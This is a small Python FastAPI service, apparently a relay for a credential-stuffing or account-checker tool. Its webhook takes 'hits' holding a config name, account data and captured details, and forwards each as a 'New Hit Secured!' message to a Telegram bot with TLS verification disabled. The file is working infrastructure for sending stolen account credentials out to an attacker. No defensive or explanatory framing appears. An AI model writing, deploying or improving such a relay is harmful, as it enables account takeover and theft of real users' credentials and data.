from fastapi import FastAPI, Request
import httpx
import os

app = FastAPI()

TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

@app.get("/")
def read_root():
    return {"status": "Bridge is running successfully"}

@app.post("/webhook/hit")
async def receive_hit(request: Request):
    try:
        data = await request.json()
        
        config_name = data.get("config", "Unknown Config")
        account_data = data.get("data", "No Data")
        captured_data = data.get("captured", "No Captured Data")
        
        # تبسيط الرسالة وتجنب أي رموز قد ترفضها صيغة Markdown
        message = (
            f"New Hit Secured!\n\n"
            f"Config: {config_name}\n"
            f"Account: {account_data}\n"
            f"Captured: {captured_data}"
        )
        
        telegram_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": message
        }
        
        with httpx.Client(verify=False) as client:
            response = client.post(telegram_url, json=payload)
            # طباعة الاستجابة في الـ Logs لمعرفة سبب عدم الوصول
            print(f"Telegram Response Status: {response.status_code}")
            print(f"Telegram Response Body: {response.text}")
            
        return {"status": "success", "telegram_status": response.status_code}
        
    except Exception as e:
        print(f"Error: {str(e)}")
        return {"status": "error", "message": str(e)}
